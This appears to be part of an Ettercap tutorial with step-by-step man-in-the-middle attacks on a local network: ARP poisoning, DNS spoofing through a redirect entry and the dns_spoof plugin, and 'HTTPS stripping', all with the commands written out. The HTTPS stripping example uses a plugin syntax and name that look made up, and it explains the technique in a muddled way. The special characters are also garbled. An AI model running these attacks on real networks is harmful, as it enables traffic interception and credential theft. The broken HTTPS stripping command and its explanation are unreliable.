## ü§∏Examples

### Example 1: Basic ARP Spoofing
To perform an ARP spoofing attack using Ettercap in graphical mode:

1. Open Ettercap in graphical mode:
   ```
   sudo ettercap -G
   ```
2. Select ‚ÄúSniff‚Äù -> ‚ÄúUnified Sniffing‚Äù.
3. Choose your network interface (e.g., eth0).
4. Scan for hosts by selecting "Hosts" -> "Scan for hosts".
5. View the hosts list by selecting "Hosts" -> "Host List".
6. Add the target machine to Target 1 and the gateway to Target 2.
7. Start ARP poisoning by selecting "Mitm" -> "ARP poisoning". Check the ‚ÄúSniff remote connections‚Äù option.
8. Start sniffing by clicking on the start button.

### Example 2: DNS Spoofing
To perform DNS spoofing with Ettercap:

1. Edit `/etc/ettercap/etter.dns` to specify which domain names should be redirected:
   ```
   www.example.com A 192.168.1.xx
   ```

2. Launch Ettercap with DNS spoof plugin:
   ```
   sudo ettercap -T -q -i eth0 -P dns_spoof -M arp // //
   ```

### Example 3: HTTPS Stripping
To demonstrate HTTPS stripping where HTTPS traffic is downgraded to HTTP:

1. Open a terminal and start Ettercap in text mode with HTTPS stripping enabled:
   ```
   sudo ettercap -T -q -i eth0 --plugin autoadd_strips httpsstrip // //
   ```

This method intercepts HTTP traffic and removes SSL encryption from it.
